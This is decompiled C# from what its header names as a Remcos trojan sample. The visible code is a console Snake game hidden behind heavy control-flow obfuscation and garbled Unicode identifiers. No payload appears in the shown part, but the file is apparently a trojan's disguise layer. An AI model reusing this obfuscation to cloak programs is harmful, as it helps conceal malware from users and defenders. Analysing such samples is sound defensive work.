// Decompiled with JetBrains decompiler
// Type: Vändtia_Live_Server.
// Assembly: W1rxzw3ZKeRvpGn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 142397A1-15D1-D7EF-251C-AE295CB71E89
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.MSIL.Remcos.gen-869da055040f18615ffee1bc2369c1e6496fce17b977c375b8501f7f91f0606d.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Threading;
using Vändtia_Live_Server.My;

namespace Vändtia_Live_Server
{
  [StandardModule]
  internal sealed class \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94
  {
    private static Thread gameLoopThread;
    private static bool suspendRenderer = true;
    private static List<Segment> snake;
    private static Queue<Segment> eraseSegment;
    private static FoodItem food;
    private static List<FoodItem> bonuses;
    private static bool youAreWhatYouEat;
    private static int lives;
    private static List<\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E1> highScores;
    private static \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E1 lastestHighScore;
    private static List<Level> levels;
    private static Level currentLevel;
    private static int foodItemsCount;
    private static int levelFoodItemsCount;
    private static \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0 reason;
    private static string defaultFont;
    private static ConsoleColor originalForeColor;
    private static ConsoleColor originalBackColor;
    private static TimeSpan foodItemLifeSpan;
    private static bool showingTimer;
    private static bool expertMode;
    private static int score;
    private static int lastScore;
    private static Random rnd;
    private static TextRenderer tr;

    static \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94()
    {
label_6:
      int num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(53);
      int num2 = 2;
      while (true)
      {
        switch (num2 ^ 61)
        {
          case 60:
            switch (num1 + 44)
            {
              case 0:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.eraseSegment = new Queue<Segment>();
                num1 = -10;
                goto label_1;
              case 1:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.lastScore = -1;
                num1 = -7;
                goto label_1;
              case 2:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.rnd = new Random();
                num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(45);
                goto label_1;
              case 3:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.levels = new List<Level>();
                num1 = -12;
                goto label_1;
              case 4:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake = new List<Segment>();
                num1 = -5;
                goto label_1;
              case 5:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses = new List<FoodItem>();
                num1 = -11;
                goto label_1;
              case 6:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.youAreWhatYouEat = true;
                num1 = -14;
                goto label_1;
              case 7:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.None;
                num1 = -6;
                goto label_1;
              case 8:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA2);
                num1 = -13;
                goto label_1;
              case 9:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.highScores = new List<\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E1>(9);
                num1 = -8;
                goto label_1;
              case 10:
                goto label_16;
              default:
                num2 = 0;
                continue;
            }
          case 61:
            goto label_6;
          case 62:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8A);
            num2 = 3;
            continue;
          case 63:
label_1:
            num1 ^= 47;
            break;
        }
        num2 = 1;
      }
label_16:;
    }

    public static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED88()
    {
label_2:
      int num1 = 112;
      Runtime.Platforms platform;
      while (true)
      {
        switch (num1 ^ 53)
        {
          case 63:
            num1 = 115;
            continue;
          case 64:
            num1 = 116;
            continue;
          case 65:
            platform = Runtime.Platform;
            num1 = 113;
            continue;
          case 66:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.originalBackColor = Console.BackgroundColor;
            num1 = 117;
            continue;
          case 67:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA2);
            num1 = 118;
            continue;
          case 68:
            if (platform != Runtime.Platforms.Windows)
            {
              num1 = 114;
              continue;
            }
            goto label_13;
          case 69:
            Console.WriteLine("Starting Snake...");
            num1 = 10;
            continue;
          case 70:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.originalForeColor = Console.ForegroundColor;
            num1 = 119;
            continue;
          case 71:
            goto label_12;
          default:
            goto label_2;
        }
      }
label_12:
      int num2 = 0;
      goto label_14;
label_13:
      num2 = 1;
label_14:
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.defaultFont = num2 != 0 ? "Consolas" : (platform == Runtime.Platforms.Mac ? "Andale Mono" : "Monospace Regular");
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.tr = new TextRenderer(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.defaultFont);
      Win32Native.MaximizeConsoleWindow();
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8A();
      if ((Console.WindowWidth >= 94 && Console.WindowHeight >= 42 ? 1 : 0) == 0)
      {
        Console.WriteLine();
label_17:
        int num3 = 8;
        while (true)
        {
          switch (num3 ^ 55)
          {
            case 58:
              Console.WriteLine("Unable to start Snake under these conditions...");
              num3 = 117;
              continue;
            case 59:
              Console.WriteLine("Please increase the size of your console/terminal window to at least 94 columns and 42 rows.");
              num3 = 11;
              continue;
            case 60:
              num3 = 115;
              continue;
            case 61:
              num3 = 12;
              continue;
            case 62:
              Console.ForegroundColor = ConsoleColor.Red;
              num3 = 116;
              continue;
            case 63:
              num3 = 9;
              continue;
            case 64:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED90);
              num3 = 119;
              continue;
            case 65:
              Console.ForegroundColor = ConsoleColor.White;
              num3 = 10;
              continue;
            case 66:
              num3 = 118;
              continue;
            case 67:
              num3 = 13;
              continue;
            case 68:
              goto label_28;
            default:
              goto label_17;
          }
        }
label_28:
        Console.WriteLine(string.Format("Your current console/terminal window has a size of {0} columns ({1}) and {2} rows ({3}).", (object) Console.WindowWidth, Console.WindowWidth >= 94 ? (object) "√" : (object) "×", (object) Console.WindowHeight, Console.WindowHeight >= 42 ? (object) "√" : (object) "×"));
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8F();
      }
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.gameLoopThread = new Thread(new ThreadStart(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED95));
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.gameLoopThread.Start();
      Console.CursorVisible = false;
      do
      {
        Thread.Sleep(100);
      }
      while ((!Console.KeyAvailable ? 1 : 0) != 0);
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED89()
    {
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8A()
    {
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8B()
    {
label_7:
      int num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(45);
      int num2 = 124;
      while (true)
      {
        switch (num2 ^ 60)
        {
          case 61:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8F);
            num2 = 1;
            continue;
          case 62:
            switch (num1 + 61)
            {
              case 0:
                num1 = -14;
                goto label_1;
              case 1:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.score = 0;
                num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(54);
                goto label_1;
              case 2:
                num1 = -13;
                goto label_1;
              case 3:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8D();
                num1 = -19;
                goto label_1;
              case 4:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.reason = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0.None;
                num1 = -20;
                goto label_1;
              case 5:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.suspendRenderer = true;
                num1 = -1;
                goto label_1;
              case 6:
                num1 = -12;
                goto label_1;
              case 7:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9D();
                num1 = -32;
                goto label_1;
              case 8:
                Console.ForegroundColor = ConsoleColor.Gray;
                num1 = -11;
                goto label_1;
              case 9:
                num1 = -24;
                goto label_1;
              case 10:
                Console.BackgroundColor = ConsoleColor.Black;
                num1 = -6;
                goto label_1;
              case 11:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED88);
                num1 = -9;
                goto label_1;
              case 12:
                num1 = -3;
                goto label_1;
              case 13:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.suspendRenderer = false;
                num1 = -29;
                goto label_1;
              case 14:
                Console.Title = "SNAKE";
                num1 = -10;
                goto label_1;
              case 15:
                num1 = -22;
                goto label_1;
              case 16:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED89();
                num1 = -4;
                goto label_1;
              case 17:
                num1 = -17;
                goto label_1;
              case 18:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8E();
                num1 = -21;
                goto label_1;
              case 19:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8C();
                num1 = -16;
                goto label_1;
              case 20:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.lives = 3;
                num1 = -2;
                goto label_1;
              case 21:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.lastScore = -1;
                num1 = -18;
                goto label_1;
              case 22:
                num1 = -23;
                goto label_1;
              case 23:
                goto label_29;
              default:
                num2 = 3;
                continue;
            }
          case 63:
            goto label_7;
          case 64:
label_1:
            num1 ^= 57;
            break;
        }
        num2 = 2;
      }
label_29:;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8C()
    {
label_2:
      int num1 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(16);
      Segment segment;
      while (true)
      {
        switch ((num1 ^ 61) + 63)
        {
          case 0:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake.Add((Segment) segment.Clone());
            num1 = -5;
            continue;
          case 1:
            num1 = -4;
            continue;
          case 2:
            num1 = -12;
            continue;
          case 3:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake.Add((Segment) segment.Clone(ConsoleColor.Gray));
            num1 = -2;
            continue;
          case 4:
            segment = new Segment(checked ((int) Math.Round(unchecked ((double) Console.WindowWidth / 2.0 - 1.0))), checked ((int) Math.Round(unchecked ((double) Console.WindowHeight / 2.0))), Segment.Directions.Right, ConsoleColor.White);
            num1 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(28);
            continue;
          case 5:
            num1 = -7;
            continue;
          case 6:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake.Clear();
            num1 = -1;
            continue;
          case 7:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94);
            num1 = -11;
            continue;
          case 8:
            goto label_11;
          default:
            goto label_2;
        }
      }
label_11:
      List<Segment> snake = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.snake;
      Action<Segment> action;
      // ISSUE: reference to a compiler-generated field
      if ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I32\u002D0 == null ? 1 : 0) == 0)
      {
        // ISSUE: reference to a compiler-generated field
        action = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I32\u002D0;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I32\u002D0 = action = (Action<Segment>) (s => s.Direction = Segment.Directions.Left);
      }
      snake.ForEach(action);
label_16:
      int num2 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(45);
      while (true)
      {
        switch ((num2 ^ 56) + 56)
        {
          case 0:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses.Clear();
            num2 = -14;
            continue;
          case 1:
            num2 = -16;
            continue;
          case 2:
            num2 = -12;
            continue;
          case 3:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.levelFoodItemsCount = 0;
            num2 = -10;
            continue;
          case 4:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food = (FoodItem) null;
            num2 = -13;
            continue;
          case 5:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9A);
            num2 = Form2.\uE173\uE5E4\uEAC5\uE066\uEF7F\uE101\uE4C9\uF1BF\uF45C\uECF8\uF52C\uEDC5(63);
            continue;
          case 6:
            goto label_22;
          default:
            goto label_16;
        }
      }
label_22:;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8D()
    {
label_4:
      int num1 = 10;
      int num2 = 7;
      while (true)
      {
        switch (num2 ^ 61)
        {
          case 55:
            goto label_4;
          case 56:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8D);
            num2 = 5;
            continue;
          case 57:
            switch (num1)
            {
              case 58:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA0);
                num1 = 15;
                goto label_1;
              case 59:
                num1 = 117;
                goto label_1;
              case 60:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.levels.Add(new Level(5, "Can U C ME?", 40, 25, Mazes.Stars(), '·'));
                num1 = 14;
                goto label_1;
              case 61:
                num1 = 119;
                goto label_1;
              case 62:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.levels.Add(new Level(3, "Real World", 20, 30, Mazes.Boxes1()));
                num1 = 116;
                goto label_1;
              case 63:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.levels.Add(new Level(1, "Warming Up", 5, 40, Mazes.Empty()));
                num1 = 8;
                goto label_1;
              case 64:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.levels.Add(new Level(6, "Fast & Wild", 60, 15, Mazes.Boxes1()));
                num1 = 118;
                goto label_1;
              case 65:
                num1 = 115;
                goto label_1;
              case 66:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.levels.Add(new Level(2, "Graduation", 15, 35, Mazes.Corners()));
                num1 = 113;
                goto label_1;
              case 67:
                num1 = 114;
                goto label_1;
              case 68:
                num1 = 11;
                goto label_1;
              case 69:
                num1 = 9;
                goto label_1;
              case 70:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.levels.Add(new Level(4, "Tiny Food", 25, 25, Mazes.Boxes2(), '■'));
                num1 = 112;
                goto label_1;
              case 71:
                goto label_8;
              default:
                num2 = 10;
                continue;
            }
          case 58:
label_1:
            num1 ^= 53;
            break;
        }
        num2 = 4;
      }
label_8:;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8E()
    {
label_2:
      int num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(47);
      Size size;
      while (true)
      {
        switch ((num1 ^ 55) + 54)
        {
          case 0:
            AsciiSnake.Render();
            num1 = -8;
            continue;
          case 1:
            num1 = -25;
            continue;
          case 2:
            \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94(Console.Title, ConsoleColor.DarkCyan, ConsoleColor.Black, true, false, \uE0C2: 9);
            num1 = -7;
            continue;
          case 3:
            num1 = -3;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated field
            if (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I34\u002D0 != null)
            {
              num1 = -29;
              continue;
            }
            goto label_15;
          case 5:
            num1 = -5;
            continue;
          case 6:
            size = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.tr.MeassureText(Console.Title);
            num1 = -26;
            continue;
          case 7:
            Console.SetCursorPosition(checked ((int) Math.Round(unchecked ((double) checked (Console.WindowWidth - 29) / 2.0 - (double) checked (size.Width + 2)))), 1);
            num1 = -6;
            continue;
          case 8:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED91);
            num1 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(21);
            continue;
          case 9:
            Console.Clear();
            num1 = -4;
            continue;
          case 10:
            goto label_14;
          default:
            goto label_2;
        }
      }
label_14:
      int num2 = 0;
      goto label_16;
label_15:
      num2 = 1;
label_16:
      // ISSUE: variable of a compiler-generated type
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA8C<int, string, ConsoleColor> obj;
      if (num2 == 0)
      {
        // ISSUE: reference to a compiler-generated field
        obj = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I34\u002D0;
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u0024I34\u002D0 = obj = (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA8C<int, string, ConsoleColor>) ((y, msg, c) =>
        {
label_6:
          int num3 = FormLoader.\uF6D9\uF827\uF028\uED0F\uECCA\uE547\uF4C8\uF468\uEA41\uE615\uE78E\uE0F5(35);
          int num4 = -10;
          while (true)
          {
            switch ((num4 ^ 59) + 54)
            {
              case 0:
                switch (num3 + 56)
                {
                  case 0:
                    num3 = -12;
                    goto label_1;
                  case 1:
                    num3 = -10;
                    goto label_1;
                  case 2:
                    // ISSUE: method reference
                    RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__.\u002Ector);
                    num3 = -14;
                    goto label_1;
                  case 3:
                    Console.SetCursorPosition(checked ((int) Math.Round(unchecked ((double) checked (Console.WindowWidth - msg.Length) / 2.0))), y);
                    num3 = -16;
                    goto label_1;
                  case 4:
                    Console.ForegroundColor = c;
                    num3 = -15;
                    goto label_1;
                  case 5:
                    num3 = -9;
                    goto label_1;
                  case 6:
                    Console.Write(msg);
                    num3 = Form2.\uE173\uE5E4\uEAC5\uE066\uEF7F\uE101\uE4C9\uF1BF\uF45C\uECF8\uF52C\uEDC5(63);
                    goto label_1;
                  case 7:
                    goto label_13;
                  default:
                    num4 = -16;
                    continue;
                }
              case 1:
                goto label_6;
              case 2:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle3 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94._Closure\u0024__._Lambda\u0024__50\u002D0);
                num4 = -9;
                continue;
              case 3:
label_1:
                num3 ^= 56;
                break;
            }
            num4 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(45);
          }
label_13:;
        });
      }
      \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED90((object) checked (size.Height + 3));
      int num5 = 0;
      int num6 = 1;
      while (true)
      {
        string[] strArray = new string[4]
        {
          "──────────────── Options ──────────────── ",
          string.Format("({0}) [Y]ou're Are What You Eat", (!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.youAreWhatYouEat ? 0 : 1) != 0 ? (object) "√" : (object) "·").PadRight(30),
